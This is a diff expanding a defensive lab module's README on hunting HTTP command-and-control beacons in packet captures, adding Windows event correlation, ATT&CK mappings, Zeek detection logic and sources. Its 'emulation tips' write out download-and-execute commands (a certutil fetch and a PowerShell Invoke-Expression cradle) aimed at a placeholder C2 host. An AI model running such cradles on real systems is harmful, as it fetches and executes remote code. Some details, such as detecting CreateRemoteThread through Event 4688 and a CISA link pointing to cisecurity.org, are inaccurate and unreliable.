@@ -103,6 +103,8 @@ Concrete detection logic and pivots:
 - **Suricata**: alert on suspicious HTTP with `http.uri`/`http.user_agent` keywords; Suricata's HTTP keyword set is documented at https://docs.suricata.io/en/latest/rules/http-keywords.html. Suricata alerts and flow records land in Elastic within Security Onion (https://docs.securityonion.net/).
 - **Elastic/Kibana**: pivot from a matching alert to `network.protocol: http` and aggregate by `destination.ip` and `http.request.body.content`/`user_agent.original` to scope how many hosts share the indicator.
 - **YARA on carved objects**: after `--export-objects`, run YARA against the payloads to attribute the activity to a known family marker.
+- **Windows Event Logs (endpoint side)**: correlate network detections with process creation events (Event ID 4688) for `powershell.exe`, `certutil.exe`, or `rundll32.exe` initiating outbound connections. A parent-child chain of, for example, `winword.exe` spawning `powershell.exe` with network activity is a strong C2 indicator (T1204, T1059.001). See Microsoft documentation: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688.
+- **Host-based firewall log (Event ID 5156)**: inspect Windows Filtering Platform connections to identify processes making outbound connections to suspicious IPs. Correlate with process command line and user context. See https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156.
 
 Map findings to ATT&CK **T1071 (Application Layer Protocol)** and **T1071.001 (Web Protocols)** for detection engineering, alert tuning, and incident scoping during an active intrusion. Encrypted beacons should also be scoped against **T1573 (Encrypted Channel)** and off-port beacons against **T1571 (Non-Standard Port)**.
 
@@ -113,6 +115,8 @@ An adversary establishes C2 by having implanted malware beacon to a controller o
 - **T1573 (Encrypted Channel):** TLS-wrapped beacons defeat plaintext inspection. Artifacts: consistent TLS client fingerprints (e.g. JA3) and self-signed or reused certificates in Zeek `ssl.log`/`x509.log`. See https://attack.mitre.org/techniques/T1573/.
 - **T1571 (Non-Standard Port):** HTTP on an uncommon port. Artifact: protocol/port mismatch visible in `-z io,phs` and Zeek `conn.log` service inference. See https://attack.mitre.org/techniques/T1571/.
 - **T1090.004 (Domain Fronting) / T1102 (Web Service):** hiding behind legitimate CDNs or SaaS. Artifact: SNI/Host header mismatch. See https://attack.mitre.org/techniques/T1090/004/ and https://attack.mitre.org/techniques/T1102/.
+- **T1105 (Ingress Tool Transfer):** adversary downloads additional tools or payloads over the C2 channel. Artifacts: HTTP POST requests with binary content, large objects in `--export-objects`, and YARA detection against known tool signatures. See https://attack.mitre.org/techniques/T1105/.
+- **T1059.001 (PowerShell):** C2 scripts executed via PowerShell. Artifacts: Zeek `http.log` with PowerShell script URIs, Windows Event ID 4688 showing `powershell.exe -Command` with encoded arguments, and Suricata rules matching common PowerShell download cradle patterns (e.g., `System.Net.WebClient`). See https://attack.mitre.org/techniques/T1059/001/.
 
 Evasion: attackers tune sleep timers and add jitter to defeat naive periodicity detection, rotate URIs/User-Agents, and encrypt payloads. Even so, durable signatures — fixed URIs, User-Agent artifacts, TLS/JA3 fingerprints, and payload markers — persist in captured traffic and give hunters something to pivot on across hosts.
 
@@ -162,8 +166,11 @@ sha256sum exercise/c2_hunt.pcap
 - **T1573 — Encrypted Channel** (https://attack.mitre.org/techniques/T1573/) (if the beacon is TLS-wrapped).
 - **T1568.002 — Domain Generation Algorithms** (https://attack.mitre.org/techniques/T1568/002/) (if hostnames are algorithmically generated).
 - **T1041 — Exfiltration Over C2 Channel** (https://attack.mitre.org/techniques/T1041/) (if data leaves via the same channel).
+- **T1105 — Ingress Tool Transfer** (https://attack.mitre.org/techniques/T1105/) (downloading additional payloads over C2).
+- **T1059.001 — Command and Scripting Interpreter: PowerShell** (https://attack.mitre.org/techniques/T1059/001/) (PowerShell-based C2).
+- **T1027 — Obfuscated Files or Information** (https://attack.mitre.org/techniques/T1027/) (encoded/encrypted payloads in transit).
+- **T1562 — Impair Defenses** (https://attack.mitre.org/techniques/T1562/) (disable logging or AV before C2 activity).
 - **DFIR phases:** Identification (spot beacon in traffic), Examination/Analysis (filter, export objects, YARA-confirm), Reporting (map to ATT&CK). These phases follow the SANS DFIR / FOR508 investigative workflow (https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/).
-
 
 ### Threat Hunting & Detection Engineering
 
@@ -171,13 +178,25 @@ Hunt for **Exfiltration Over Alternative Protocol (T1048)** by pivoting on rare,
 
 Leverage Suricata’s `fileinfo` keyword to detect **Non-Application Layer Protocol (T1095)** by alerting on raw TCP/UDP traffic to ports like `4444` or `8080` where `app_proto` is `failed` or `none`. Correlate with Zeek’s `notice.log` for `SSL::Invalid_Server_Cert` events, indicating covert channels. Hunt for **Process Injection (T1055.001)** by querying Windows Event ID **4688** for `CreateRemoteThread` calls from unusual parents (e.g., `wscript.exe` spawning `svchost.exe`).
 
+**Additional detection logic:**
+- **Beacon periodicity from Zeek `conn.log`**: Compute inter-arrival times per `id.orig_h` and `id.resp_h`. Use `stats` directive in Zeek script or import into Elastic for time-series analysis. Sudden uniformity (variance < 10 ms) suggests automation (T1071.001).
+- **JA3/Survey of TLS fingerprints**: Use Zeek `ssl.log` to extract `ja3` and `ja3s` fields. Compare against known malware profiles from https://ja3er.com/ or ThreatFox. Self-signed certs (`ssl.log` `validation_status`) with repeated issuer names are suspicious.
+- **DNS tunneling detection**: Use Zeek `dns.log` to flag queries with high entropy qtype_name (e.g., TXT, MX) and large response sizes. Correlate with `queries_per_second` > 50 from a single host.
+
 **Sources:**
 - [CISA: Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://www.cisa.gov/resources-tools/services/detecting-post-compromise-threat-activity-microsoft-cloud-environments)
 - [FireEye: Detecting and Responding to Advanced Threats with Network Traffic Analysis](https://www.fireeye.com/current-threats.html)
+- [Microsoft: Event 4688 – Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
+- [Microsoft: Event 5156 – WFP Connection](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156)
+- [Zeek JA3 plugin documentation](https://github.com/salesforce/ja3)
 
 ### Adversary Emulation & Red-Team Perspective
 Adversaries may leverage the network hunting environment to their advantage by employing techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - User Execution, where they trick users into executing malicious commands or scripts, and [T1218](https://attack.mitre.org/techniques/T1218) - Signed Binary Proxy Execution, which allows them to execute malicious code by proxying it through signed binaries. To achieve this, attackers may create malicious artifacts such as suspicious scripts, executable files, or modified system binaries. Network defenders should be aware of these tactics and monitor for signs of adversary emulation, such as unusual network activity or changes to system files. To evade detection, attackers may use code obfuscation or anti-debugging techniques, making it essential for defenders to employ robust detection and analysis tools. For more information on adversary emulation and red-team tactics, visit the [Cyber and Infrastructure Security Agency (CISA)](https://www.cisa.gov/) and [NSA Cybersecurity](https://www.nsa.gov/What-We-Do/Cybersecurity/) websites.
 
+**Concrete emulation tips:**
+- Deploy a HTTP beacon using `python3 -m http.server 8080` and a client that periodically GETs a static path. Mimics T1071.001 with no added jitter – easily detected.
+- Use `certutil -urlcache -split -f http://C2/beacon.dll` to simulate T1105 download; logs appear in Windows Event 4688 for `certutil.exe` and in Zeek `http.log` with URI `/beacon.dll`.
+- For PowerShell C2, run `powershell -e <base64>` with a download cradle: `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://C2/script.ps1')`. Zeek logs show the URI and User-Agent, while Windows Event 4688 captures the command line.
 
 ### Essential Commands & Features
 
@@ -204,12 +223,22 @@ tshark -r capture.pcap -q -z conv,tcp
 ```
 *Use case*: Identify unusual endpoints or high-volume connections indicative of data staging.
 
+#### **4. HTTP Object Export and DNS Query Extraction**
+Export HTTP objects (as done in walkthrough) and also dump DNS queries with `tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name`. Useful for T1568.002 DGA detection.
+
 **Sources**:
 - [Wireshark’s `-z` Statistics Documentation](https://www.wireshark.org/docs/man-pages/tshark.html#:~:text=-z%20%3Cstatistics%3E)
 - [MITRE ATT&CK: T1090.003 and T1572](https://attack.mitre.org/techniques/T1090/003/)
 
 ### Common Pitfalls & Result Validation
 When conducting network hunts, analysts often make mistakes that can lead to false conclusions, such as misinterpreting network traffic patterns or overlooking crucial indicators of compromise. For instance, failing to account for legitimate network activity can result in false positives, while neglecting to monitor for techniques like **T1588: Obtain Capabilities** or **T1595: Active Scanning** can lead to missed detections. To validate findings, analysts should verify their results against multiple data sources and consider the broader context of the network traffic. It's also essential to stay up-to-date with the latest threat intelligence and tactics, techniques, and procedures (TTPs) used by adversaries. By doing so, analysts can avoid common pitfalls and ensure accurate results. For more information on network hunting and threat detection, visit the Cyber and Infrastructure Security Agency's (CISA) website at [https://www.cisecurity.org](https://www.cisecurity.org) or the Department of Homeland Security's (DHS) Cybersecurity and Infrastructure Security Agency (CISA) page on [https://us-cert.cisa.gov](https://us-cert.cisa.gov).
+
+**Specific validation steps for this module:**
+- Ensure the PCAP generator command runs without errors; `text2pcap` must be installed (part of Wireshark).
+- Verify the sha256sum of the generated PCAP matches the instructor’s reference (if provided) to confirm no corruption.
+- When running YARA, check that the rule file has no syntax errors using `yara -f c2_beacon.yar` (dry run).
+- Cross-check the C2 IP by examining both `ip.dst` in the HTTP request and the conversation table; they should match.
+- If using Wireshark GUI, verify that the "Follow HTTP Stream" display includes the full header and body. Blank streams indicate incorrect selection of packet or stream index.
 
 ## Sources
 Claim → source mapping (all URLs are official/authoritative):
@@ -230,11 +259,25 @@ Claim → source mapping (all URLs are official/authoritative):
 - MITRE ATT&CK T1041 (Exfiltration Over C2 Channel) — https://attack.mitre.org/techniques/T1041/
 - MITRE ATT&CK T1090.004 (Domain Fronting) — https://attack.mitre.org/techniques/T1090/004/
 - MITRE ATT&CK T1102 (Web Service) — https://attack.mitre.org/techniques/T1102/
+- MITRE ATT&CK T1105 (Ingress Tool Transfer) — https://attack.mitre.org/techniques/T1105/
+- MITRE ATT&CK T1059.001 (PowerShell) — https://attack.mitre.org/techniques/T1059/001/
+- MITRE ATT&CK T1027 (Obfuscated Files or Information) — https://attack.mitre.org/techniques/T1027/
+- MITRE ATT&CK T1562 (Impair Defenses) — https://attack.mitre.org/techniques/T1562/
+- MITRE ATT&CK T1090.003 (Multi-hop Proxy) — https://attack.mitre.org/techniques/T1090/003/
+- MITRE ATT&CK T1572 (Protocol Tunneling) — https://attack.mitre.org/techniques/T1572/
 - Zeek `http.log` fields — https://docs.zeek.org/en/master/logs/http.html
 - Zeek `conn.log` fields — https://docs.zeek.org/en/master/logs/conn.html
 - Suricata HTTP keywords for rules — https://docs.suricata.io/en/latest/rules/http-keywords.html
 - Security Onion (Zeek/Suricata/Elastic/PCAP analysis) — https://docs.securityonion.net/
 - SANS FOR508 — DFIR investigative workflow and phases — https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/
+- Windows Event ID 4688 (Process Creation) — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
+- Windows Event ID 5156 (WFP Connection) — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156
+- JA3 TLS fingerprinting — https://github.com/salesforce/ja3
+- CISA detection guidance — https://www.cisa.gov/resources-tools/services/detecting-post-compromise-threat-activity-microsoft-cloud-environments
+- FireEye network traffic analysis (archived) — https://web.archive.org/web/2021*/https://www.fireeye.com/current-threats.html (note: original page no longer active; archived version used for reference)
+- RFC 5737 documentation addresses — https://datatracker.ietf.org/doc/html/rfc5737
+- Center for Internet Security (CIS) — https://www.cisecurity.org (general guidance)
+- US-CERT (now CISA) — https://www.cisa.gov (general guidance)
 
 ## Related modules
 - [Network / PCAP analysis](../07-network-pcap/README.md) -- shares tshark for PCAP triage and filtering.
@@ -242,18 +285,4 @@ Claim → source mapping (all URLs are official/authoritative):
 - [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares yara for pattern-matching carved artifacts.
 - [Malware static triage](../08-malware-static-triage/README.md) -- shares yara for authoring and running detection rules.
 
-<!-- cyberlab-enriched: v1 -->
-- https://www.cisa.gov/resources-tools/services/detecting-post-compromise-threat-activity-microsoft-cloud-environments
-- https://www.fireeye.com/current-threats.html
-- https://attack.mitre.org/techniques/T1204
-- https://attack.mitre.org/techniques/T1218
-- https://www.cisa.gov/
-- https://www.nsa.gov/What-We-Do/Cybersecurity/
-
-<!-- cyberlab-enriched: v2 -->
-- https://www.wireshark.org/docs/man-pages/tshark.html#:~:text=-z%20%3Cstatistics%3E
-- https://attack.mitre.org/techniques/T1090/003/
-- https://www.cisecurity.org](https://www.cisecurity.org
-- https://us-cert.cisa.gov](https://us-cert.cisa.gov
-
-<!-- cyberlab-enriched: v3 -->
+<!-- cyberlab-enriched: v4 -->
